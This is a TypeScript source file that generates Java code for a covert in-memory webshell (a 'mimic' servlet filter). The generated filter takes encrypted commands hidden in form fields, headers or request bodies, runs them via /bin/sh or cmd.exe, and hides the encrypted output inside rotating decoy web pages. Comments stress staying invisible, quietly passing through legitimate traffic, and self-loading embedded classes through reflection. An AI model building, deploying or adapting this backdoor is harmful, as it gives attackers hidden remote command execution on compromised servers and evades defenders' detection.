/**
 * Java source rendering for the mimic filter — the server half of the mimic
 * protocol, generated from a site profile and compiled by `memparty custom
 * build` (see docs/custom-memshell-design.md §B / mimic-memshell-guide.md).
 *
 * The crypto/encoding/padTail snippets below are the Java twins of
 * src/connect/mimic-codecs.ts. They are emitted VERBATIM into both the
 * filter and the CryptoProbe harness (renderCryptoProbe) — the probe is what
 * src/custom/java-probe.test.ts runs to prove the two languages produce
 * byte-compatible wire values. Never edit a snippet in only one place.
 *
 * The filter itself keeps the proven V6 behaviour:
 *   - probe with getParameter()/getHeader() only (never touch the body
 *     stream, so Behinder-style raw-body shells behind us keep working);
 *   - anything that isn't ours falls through chain.doFilter untouched;
 *   - any error answers with the plain cover page (stay quiet);
 *   - the cover pages rotate per response.
 */
import type { MimicCipher } from "../connect/mimic-codecs.js";

export interface FilterTemplateOptions {
  /** Simple class name, e.g. "MimicFilterAb3d" (package is always `mimic`). */
  className: string;
  /** Credential pair — must match the client's --pass/--key at connect time. */
  pass: string;
  secret: string;
  /** Carrier field names (form fields / headers) that may hold the ciphertext. */
  fields: string[];
  /**
   * Lowercase Content-Type needles (contains-match): the body is read only
   * when its Content-Type matches one — derived from the profile's body
   * shapes. Empty = never touch the body stream: reading a body the shell
   * doesn't own consumes it and breaks the app behind us.
   */
  bodyContentTypes: string[];
  /** Cover bodies from the site profile (rotated per response, each with its contentType). */
  templates: Array<{ template: string; contentType: string }>;
  cipher: MimicCipher;
  /**
   * Base64 bytes of the body-wrapper classes (renderWrapperJava, compiled by
   * the build's first phase). The filter self-defines them at runtime so the
   * uploaded shell stays a single self-contained class — MemShellParty's
   * Custom generator can only resolve one class.
   */
  wrapper: { bodyB64: string; streamB64: string };
}

/**
 * The body-caching request wrapper, as a standalone fixed source — compiled
 * in the build's first phase, then embedded into the filter as base64 (it
 * self-defines the classes at runtime). Kept anonymous-class-free ON
 * PURPOSE: every named .class file must be embedded and defined explicitly.
 */
export function renderWrapperJava(): string {
  return `package mimic;

import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

/** Re-exposes a consumed request body to downstream filters/servlets. */
public class CachedBody extends HttpServletRequestWrapper {
    private final byte[] body;

    public CachedBody(HttpServletRequest req, byte[] body) {
        super(req);
        this.body = body;
    }

    public ServletInputStream getInputStream() {
        return new Stream(body);
    }

    public BufferedReader getReader() {
        return new BufferedReader(new InputStreamReader(getInputStream()));
    }

    static class Stream extends ServletInputStream {
        private final ByteArrayInputStream in;

        Stream(byte[] body) {
            this.in = new ByteArrayInputStream(body);
        }

        public int read() {
            return in.read();
        }

        public boolean isFinished() {
            return in.available() == 0;
        }

        public boolean isReady() {
            return true;
        }

        public void setReadListener(ReadListener l) {}
    }
}
`;
}

/** Escape a string for embedding as a Java string literal (non-ASCII -> \uXXXX). */
export function javaStringLiteral(s: string): string {
  return s
    .replaceAll("\\", "\\\\")
    .replaceAll('"', '\\"')
    .replaceAll("\r", "")
    .replaceAll("\n", "\\n")
    // eslint-disable-next-line no-control-regex
    .replaceAll(/[^\x00-\x7f]/g, (ch) => `\\u${ch.codePointAt(0)!.toString(16).padStart(4, "0")}`);
}

/** Java for the runtime self-loader (defines the embedded wrapper classes once). */
function wrapperLoaderMethods(opts: FilterTemplateOptions): string {
  return `
    /** wrapper class bytes (mimic.CachedBody + its stream) — embedded so the
        uploaded shell stays a single self-contained class file */
    static final String WRAPPER_B64 = "${opts.wrapper.bodyB64}";
    static final String WRAPPER_STREAM_B64 = "${opts.wrapper.streamB64}";

    static Class<?> forNameQuiet(String name, ClassLoader cl) {
        try {
            return Class.forName(name, true, cl);
        } catch (Throwable t) {
            return null;
        }
    }

    static Class<?> defineQuiet(ClassLoader cl, String name, String b64) {
        try {
            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass",
                String.class, byte[].class, int.class, int.class);
            m.setAccessible(true);
            byte[] bytes = java.util.Base64.getDecoder().decode(b64);
            return (Class<?>) m.invoke(cl, name, bytes, 0, bytes.length);
        } catch (Throwable t) {
            return null; // another shell in this JVM already defined it
        }
    }

    /** Wrap the request so downstream code can re-read the JSON body we consumed. */
    static HttpServletRequest wrapBody(HttpServletRequest req, byte[] body) throws Exception {
        ClassLoader cl = ${opts.className}.class.getClassLoader();
        Class<?> c = forNameQuiet("mimic.CachedBody", cl);
        if (c == null) {
            defineQuiet(cl, "mimic.CachedBody$Stream", WRAPPER_STREAM_B64);
            c = defineQuiet(cl, "mimic.CachedBody", WRAPPER_B64);
            if (c == null) c = forNameQuiet("mimic.CachedBody", cl);
        }
        return (HttpServletRequest) c.getConstructor(HttpServletRequest.class, byte[].class)
            .newInstance(req, body);
    }
`;
}

// ---------------------------------------------------------------------------
// Shared method snippets — identical in the filter and the CryptoProbe.
// ---------------------------------------------------------------------------

const MD5_METHOD = String.raw`
    static String md5Hex(String s) throws Exception {
        MessageDigest m = MessageDigest.getInstance("MD5");
        byte[] d = m.digest(s.getBytes("UTF-8"));
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }
`;

function cryptMethod(algorithm: MimicCipher["algorithm"]): string {
  switch (algorithm) {
    case "aes-ecb":
      return String.raw`
    static byte[] crypt(byte[] data, String key, boolean enc) throws Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(enc ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE,
               new SecretKeySpec(key.getBytes("UTF-8"), "AES"));
        return c.doFinal(data);
    }
`;
    case "aes-cbc":
      return String.raw`
    static byte[] crypt(byte[] data, String key, boolean enc) throws Exception {
        Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec ks = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
        if (enc) {
            byte[] iv = new byte[16];
            new java.security.SecureRandom().nextBytes(iv);
            c.init(Cipher.ENCRYPT_MODE, ks, new IvParameterSpec(iv));
            byte[] ct = c.doFinal(data);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(iv);
            bos.write(ct);
            return bos.toByteArray();
        }
        c.init(Cipher.DECRYPT_MODE, ks, new IvParameterSpec(data, 0, 16));
        return c.doFinal(data, 16, data.length - 16);
    }
`;
    case "xor":
      return String.raw`
    static byte[] crypt(byte[] data, String key, boolean enc) throws Exception {
        byte[] k = key.getBytes("UTF-8");
        byte[] out = new byte[data.length];
        for (int i = 0; i < data.length; i++) out[i] = (byte) (data[i] ^ k[i % k.length]);
        return out;
    }
`;
  }
}

function encDecMethods(encoding: MimicCipher["encoding"]): string {
  switch (encoding) {
    case "base64":
      return String.raw`
    static String enc(byte[] data) {
        return java.util.Base64.getEncoder().encodeToString(data);
    }
    static byte[] dec(String s) {
        return java.util.Base64.getDecoder().decode(s);
    }
`;
    case "base64url":
      return String.raw`
    static String enc(byte[] data) {
        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(data);
    }
    static byte[] dec(String s) {
        return java.util.Base64.getUrlDecoder().decode(s);
    }
`;
    case "hex":
      return String.raw`
    static String enc(byte[] data) {
        StringBuilder sb = new StringBuilder();
        for (byte b : data) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }
    static byte[] dec(String s) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (int i = 0; i + 1 < s.length(); i += 2) bos.write(Integer.parseInt(s.substring(i, i + 2), 16));
        return bos.toByteArray();
    }
`;
  }
}

/** Behinder aes_with_magic's trick: junk tail of key-derived length (0-15). */
const PAD_METHODS = String.raw`
    static int padLen(String aesKey) throws Exception {
        return Integer.parseInt(md5Hex(aesKey).substring(0, 2), 16) % 16;
    }
    static String appendPad(String s, String aesKey) throws Exception {
        int n = padLen(aesKey);
        StringBuilder sb = new StringBuilder(s);
        java.util.Random r = new java.util.Random();
        for (int i = 0; i < n; i++) {
            sb.append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(r.nextInt(62)));
        }
        return sb.toString();
    }
    static String stripPad(String s, String aesKey) throws Exception {
        int n = padLen(aesKey);
        return n == 0 ? s : s.substring(0, Math.max(0, s.length() - n));
    }
`;

function fieldTransforms(cipher: MimicCipher): string {
  const afterEncode = cipher.padTail ? "appendPad(s, aesKey)" : "s";
  const beforeDecode = cipher.padTail ? "stripPad(v, aesKey)" : "v";
  return `
    static String encryptField(byte[] plain, String aesKey) throws Exception {
        String s = enc(crypt(plain, aesKey, true));
        return ${afterEncode};
    }
    static byte[] decryptField(String v, String aesKey) throws Exception {
        String s = ${beforeDecode};
        return crypt(dec(s), aesKey, false);
    }
`;
}

/** Wrap the ciphertext into the fragment injected into the cover page. */
function wrapPayloadMethod(marker: MimicCipher["marker"]): string {
  if (marker === "html-comment") {
    return String.raw`
    static String wrapPayload(String payload, String passKey) throws Exception {
        return "<!--Re" + md5Hex(passKey).substring(0, 5) + "_config:" + payload + "-->";
    }
`;
  }
  return String.raw`
    static String wrapPayload(String payload, String passKey) throws Exception {
        return "<script>var Re" + md5Hex(passKey).substring(0, 5) + "_config=\"" + payload + "\";</script>";
    }
`;
}

/** All shared snippets in emission order (filter and probe use this order). */
function sharedMethods(cipher: MimicCipher): string {
  return (
    MD5_METHOD +
    cryptMethod(cipher.algorithm) +
    encDecMethods(cipher.encoding) +
    (cipher.padTail ? PAD_METHODS : "") +
    fieldTransforms(cipher)
  );
}

// ---------------------------------------------------------------------------
// The servlet filter (server half of the protocol).
// ---------------------------------------------------------------------------

export function renderFilterJava(opts: FilterTemplateOptions): string {
  const { className, pass, secret, fields, bodyContentTypes, templates, cipher } = opts;
  const fieldsJava = fields.map((f) => `"${javaStringLiteral(f)}"`).join(", ");
  const bodyCtsJava = bodyContentTypes.map((n) => `"${javaStringLiteral(n)}"`).join(", ");
  const tplsJava = templates.map((t) => `        "${javaStringLiteral(t.template)}"`).join(",\n");
  const ctsJava = templates.map((t) => `"${javaStringLiteral(t.contentType)}"`).join(", ");

  return `package mimic;

import java.io.*;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.*;

/**
 * mimic protocol server (matches src/connect/mimic-codecs.ts):
 *   cipher=${cipher.algorithm} encoding=${cipher.encoding} padTail=${cipher.padTail} marker=${cipher.marker}
 *
 * Detection uses getParameter()/getHeader() first, never touching the body
 * stream. For JSON bodies it reads the stream ONCE and re-exposes it via a
 * caching wrapper, so the app's own endpoints (and other shells behind us)
 * still see the body. Anything that is not ours falls through chain.doFilter;
 * any error answers with the plain cover template.
 */
public class ${className} implements Filter {
    /** carriers that may hold the ciphertext (form fields / headers, from the profile) */
    static final String[] FIELDS = { ${fieldsJava} };
    /** body Content-Type needles the shell owns — anything else passes with its body untouched */
    static final String[] BODY_CTS = { ${bodyCtsJava} };
    /** credentials — must match the client's --pass/--key (key + marker derivation) */
    static final String PASS = "${javaStringLiteral(pass)}";
    static final String SECRET = "${javaStringLiteral(secret)}";
    /** Cover bodies from the site profile — rotated per response so the skin varies. */
    static final String[] TPLS = {
${tplsJava}
    };
    /** Content-Type of each cover body (parallel to TPLS). */
    static final String[] CTS = { ${ctsJava} };

    public void init(FilterConfig filterConfig) {}
    public void destroy() {}
${sharedMethods(cipher)}${wrapPayloadMethod(cipher.marker)}
    static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) != -1) bos.write(buf, 0, n);
        return bos.toByteArray();
    }

    /** read the body only when its Content-Type is one the profile actually uses */
    static boolean ctMatches(String ct) {
        String l = ct.toLowerCase();
        for (String n : BODY_CTS) if (l.contains(n)) return true;
        return false;
    }

    /** minimal "field":"value" extraction — cipher values carry no quotes/escapes */
    static String jsonField(String body, String field) {
        String needle = "\\"" + field + "\\"";
        int i = body.indexOf(needle);
        if (i < 0) return null;
        int colon = body.indexOf(':', i + needle.length());
        if (colon < 0) return null;
        int q1 = body.indexOf('"', colon + 1);
        if (q1 < 0) return null;
        int q2 = body.indexOf('"', q1 + 1);
        if (q2 < 0) return null;
        return body.substring(q1 + 1, q2);
    }

    /** minimal multipart extraction: the value follows the part headers of name="field" */
    static String multipartField(String body, String field) {
        String needle = "name=\\"" + field + "\\"";
        int i = body.indexOf(needle);
        if (i < 0) return null;
        int sep = body.indexOf("\\r\\n\\r\\n", i + needle.length());
        int sepLen = 4;
        if (sep < 0) { sep = body.indexOf("\\n\\n", i + needle.length()); sepLen = 2; }
        if (sep < 0) return null;
        int start = sep + sepLen;
        int end = body.indexOf('\\n', start);
        if (end < 0) end = body.length();
        String v = body.substring(start, end).trim();
        return v.isEmpty() ? null : v;
    }

    /** minimal XML extraction: <field>value</field> */
    static String xmlField(String body, String field) {
        String open = "<" + field + ">";
        int i = body.indexOf(open);
        if (i < 0) return null;
        int start = i + open.length();
        int end = body.indexOf("</" + field + ">", start);
        if (end < 0) return null;
        return body.substring(start, end);
    }
${wrapperLoaderMethods(opts)}
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest httpReq = request instanceof HttpServletRequest
                ? (HttpServletRequest) request : null;
        String value = null;
        for (String f : FIELDS) {
            value = request.getParameter(f);
            if (value == null && httpReq != null) {
                // secretIn=header: the ciphertext may ride a header instead of a form field
                value = httpReq.getHeader(f);
            }
            if (value != null) break;
        }
        if (value == null && httpReq != null) {
            // the ciphertext may ride a raw body of any bodyTemplate shape
            // (JSON / multipart / XML…). Read it once and re-expose it
            // downstream via the caching wrapper.
            String ct = httpReq.getContentType();
            if (ct != null && ctMatches(ct)) {
                try {
                    byte[] bodyBytes = readAll(httpReq.getInputStream());
                    String bodyText = new String(bodyBytes, "UTF-8");
                    for (String f : FIELDS) {
                        value = jsonField(bodyText, f);
                        if (value == null) value = multipartField(bodyText, f);
                        if (value == null) value = xmlField(bodyText, f);
                        if (value != null) break;
                    }
                    request = wrapBody(httpReq, bodyBytes);
                } catch (Throwable wrapperFailed) {
                    // the body is already consumed — pass through as-is
                }
            }
        }
        if (value == null) {
            chain.doFilter(request, response);
            return;
        }
        String aesKey;
        byte[] cmd;
        try {
            aesKey = md5Hex(SECRET).substring(0, 16);
            cmd = decryptField(value, aesKey);
        } catch (Exception notOurs) {
            // the field exists but doesn't decrypt — this is someone else's
            // legitimate request (e.g. the real login POST), stay invisible
            chain.doFilter(request, response);
            return;
        }
        int ti = new java.util.Random().nextInt(TPLS.length);
        String tpl = TPLS[ti];
        String tplCt = CTS[ti];
        try {
            String command = new String(cmd, "UTF-8");
            boolean win = System.getProperty("os.name").toLowerCase().contains("win");
            ProcessBuilder pb = win
                ? new ProcessBuilder("cmd.exe", "/c", command)
                : new ProcessBuilder("/bin/sh", "-c", command);
            pb.redirectErrorStream(true);
            Process proc = pb.start();
            proc.waitFor();
            String payload = encryptField(readAll(proc.getInputStream()), aesKey);
            String page;
            if (tpl.contains("{{payload}}")) {
                // placeholder template (any text format): substitute exactly there
                page = tpl.replace("{{payload}}", payload);
            } else {
                String fragment = wrapPayload(payload, PASS + SECRET);
                int idx = tpl.toLowerCase().lastIndexOf("</body>");
                page = idx >= 0 ? tpl.substring(0, idx) + fragment + tpl.substring(idx) : tpl + fragment;
            }
            response.setContentType(tplCt);
            response.setCharacterEncoding("UTF-8");
            if (tplCt.contains("event-stream")) {
                // flush chunk by chunk — a real SSE endpoint streams, a
                // one-shot body is the wrong shape on the wire
                java.io.PrintWriter w = response.getWriter();
                for (String chunk : page.split("\\n\\n", -1)) {
                    if (chunk.isEmpty()) continue;
                    w.write(chunk);
                    w.write("\\n\\n");
                    w.flush();
                    response.flushBuffer();
                    try { Thread.sleep(30); } catch (InterruptedException ie) { break; }
                }
            } else {
                response.getWriter().write(page);
            }
        } catch (Exception e) {
            // behave like the cover body on any error — stay quiet
            response.setContentType(tplCt);
            response.getWriter().write(tpl);
        }
    }
}
`;
}

// ---------------------------------------------------------------------------
// CryptoProbe — a tiny CLI harness around the same snippets, used by the
// cross-language tests: `java CryptoProbe enc|dec <secret> <value>`.
// ---------------------------------------------------------------------------

export function renderCryptoProbe(cipher: MimicCipher): string {
  return `import java.io.*;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/** Cross-language test harness — shares every snippet with the mimic filter. */
public class CryptoProbe {
${sharedMethods(cipher)}
    static String bytesToHex(byte[] data) {
        StringBuilder sb = new StringBuilder();
        for (byte b : data) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }
    static byte[] hexToBytes(String s) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (int i = 0; i + 1 < s.length(); i += 2) bos.write(Integer.parseInt(s.substring(i, i + 2), 16));
        return bos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        String aesKey = md5Hex(args[1]).substring(0, 16);
        if ("enc".equals(args[0])) {
            // hex plaintext on argv -> wire value on stdout
            System.out.println(encryptField(hexToBytes(args[2]), aesKey));
        } else {
            // wire value on argv -> hex plaintext on stdout
            System.out.println(bytesToHex(decryptField(args[2], aesKey)));
        }
    }
}
`;
}
